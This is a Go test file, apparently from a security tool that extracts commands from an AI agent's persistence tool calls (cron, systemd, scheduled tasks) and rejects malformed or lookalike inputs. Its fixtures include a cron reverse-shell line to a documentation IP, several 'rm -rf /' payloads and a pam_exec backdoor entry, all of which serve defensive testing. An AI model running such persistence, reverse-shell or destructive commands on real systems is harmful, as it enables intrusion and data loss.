// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"encoding/json"
	"testing"
)

func TestExactPersistenceCommandProjection(t *testing.T) {
	tests := []struct {
		name    string
		method  string
		payload string
		command string
		program string
	}{
		{
			name: "cron schedule", method: "cron",
			payload: "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'",
			command: "/bin/bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'",
			program: "bash",
		},
		{
			name: "cron reboot alias", method: "cron",
			payload: "@reboot /usr/local/bin/agent", command: "/usr/local/bin/agent",
		},
		{
			name: "systemd unit", method: "systemd",
			payload: "[Unit]\nDescription=fixture\n[Service]\nExecStart=/bin/bash -c 'id'\nRestart=always",
			command: "/bin/bash -c 'id'",
			program: "bash",
		},
		{
			name: "scheduled task command", method: "scheduled_task",
			payload: "powershell.exe -c \"Write-Output fixture\"",
			command: "powershell.exe -c \"Write-Output fixture\"", program: "powershell.exe",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			raw, err := json.Marshal(map[string]string{"method": test.method, "payload": test.payload})
			if err != nil {
				t.Fatal(err)
			}
			extracted := extractExactPersistenceArgs(raw)
			if extracted.status != StatusComplete || extracted.command != test.command {
				t.Fatalf("extracted=%+v want_command=%q", extracted, test.command)
			}
			facts := Analyze(Input{Tool: "persist", Args: raw, CWD: "/"})
			if len(facts.Commands) == 0 ||
				(test.program != "" && facts.Commands[0].Program != test.program) {
				t.Fatalf("facts=%+v", facts)
			}
		})
	}
}

func TestExactPersistenceInputStaysClosed(t *testing.T) {
	tests := []json.RawMessage{
		json.RawMessage(`{"method":"ssh_key","payload":"ssh-rsa fixture"}`),
		json.RawMessage(`{"method":"pam_module","payload":"auth sufficient pam_exec.so /tmp/a"}`),
		json.RawMessage(`{"method":"cron","payload":"@sometimes /tmp/a"}`),
		json.RawMessage(`{"method":"systemd","payload":"[Service]\nRestart=always"}`),
		json.RawMessage(`{"method":"systemd","payload":"ExecStart=/bin/one\nExecStart=/bin/two"}`),
		json.RawMessage(`{"method":"cron","payload":"id","extra":"rm -rf /"}`),
		json.RawMessage(`{"method":"cron","method":"systemd","payload":"rm -rf /"}`),
	}
	for _, raw := range tests {
		facts := Analyze(Input{Tool: "persist", Args: raw, CWD: "/"})
		if facts.Authoritative() || len(facts.Commands) != 0 {
			t.Fatalf("closed schema escaped: raw=%s facts=%+v", raw, facts)
		}
	}
}

func TestUnownedPersistenceLookalikeNeverExecutesPayload(t *testing.T) {
	raw := json.RawMessage(`{"method":"cron","payload":"rm -rf /"}`)
	for _, tool := range []string{"persistence", "persist_document", "file_write"} {
		facts := Analyze(Input{Tool: tool, Args: raw, CWD: "/"})
		if len(facts.Commands) != 0 {
			t.Fatalf("tool=%q escaped exact persist contract: %+v", tool, facts)
		}
	}
}
